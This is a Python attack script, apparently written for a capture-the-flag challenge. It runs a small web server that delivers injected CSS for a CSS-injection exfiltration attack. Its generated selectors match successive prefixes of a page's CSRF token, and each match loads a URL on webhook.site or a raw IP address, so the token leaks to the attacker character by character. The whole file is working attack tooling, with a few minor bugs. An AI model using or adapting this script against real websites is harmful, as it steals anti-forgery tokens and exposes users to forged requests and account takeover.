#!/usr/bin/env python3
"""

SERVE I FAKE CSS 

"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging, time


URL = "http://2.44.17.210:5001/AHRG"
URL = "https://webhook.site/8b0d3918-9d57-4e28-b225-2e1c251118c6?"

# genera il template del css
def get_template(v):
  # return "input[name='csrf'][value^='" + v + "'] ~ * {  background-image: url('" + URL + v + "'); }"
  return "input[name='csrf'][value^='" + v + "']::after {  content: url('" + URL + v + "'); }"


# prende in input il valore corrente del csrf token e restituisce il prossimo css da injettare
def generate_css(value:str) -> str:
  out = []
  for h in '0123456789abcdefX':
    out += [get_template(value+h)]
  return "\n".join(out)


# print(generate_css('generate_css'))


class S(BaseHTTPRequestHandler):
    
    def do_GET(self):
        
        print('path', self.path)
        # logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        
        if self.path == '/include.css':
          self.send_response(200)
          self.send_header('Content-type', 'text/css')
          self.end_headers()
          with open('include.css', 'rb') as s:
            html = s.read()
          self.wfile.write(html)

        if self.path == '/include2.css':
          self.send_response(200)
          self.send_header('Content-type', 'text/css')
          self.end_headers()
          with open('include2.css', 'rb') as s:
            html = s.read()
          self.wfile.write(html)

        if 'payload' in self.path:
          self.send_response(200)
          self.send_header('Content-type', 'text/css')
          self.end_headers()
          time.sleep(2)
          with open('csrf.txt', 'r') as csrf:
            print(csrf.read())
            css = generate_css(csrf.read())
          self.wfile.write(css.encode())

        if self.path == '/index.html' or self.path == '/':
          self.send_response(200)
          self.send_header('Content-type', 'text/html')
          self.end_headers()
          with open('index.html', 'rb') as s:
            html = s.read()
          self.wfile.write(html)
        # self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=5000):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info(f'Starting http {"127.0.0.1"}:{port}\n')
    httpd.serve_forever()
    # try:
    #     httpd.serve_forever()
    # except KeyboardInterrupt:
    #     pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()